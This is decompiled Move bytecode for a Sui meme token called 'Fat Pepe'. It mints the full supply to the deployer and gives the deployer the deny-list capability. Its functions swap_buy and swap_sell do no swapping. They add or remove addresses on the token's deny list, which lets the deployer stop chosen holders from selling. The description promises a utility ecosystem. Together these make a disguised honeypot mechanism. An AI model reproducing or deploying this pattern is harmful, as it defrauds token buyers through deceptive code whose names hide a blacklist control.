module 0x749ecf5657b3a55a1a283a1b078e4cd18f0f83cf3a37153c162247ab356a222e::fatpepe {
    struct FATPEPE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: FATPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<FATPEPE>(arg0, 9, b"FATPEPE", b"Fat Pepe", b"FatPepe is the latest meme token, featuring a chubby, loveable frog mascot that hops its way into the crypto world. With community-driven growth and a fun, lighthearted approach, FatPepe stands out in a saturated market by bringing a smile to investors' faces while building a robust utility ecosystem.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://node1.irys.xyz/7Misf-PsuT9zcBG-5HQDpCP7y1MaYj3qaZTNi39kfr0"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<FATPEPE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FATPEPE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<FATPEPE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<FATPEPE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FATPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<FATPEPE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<FATPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<FATPEPE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

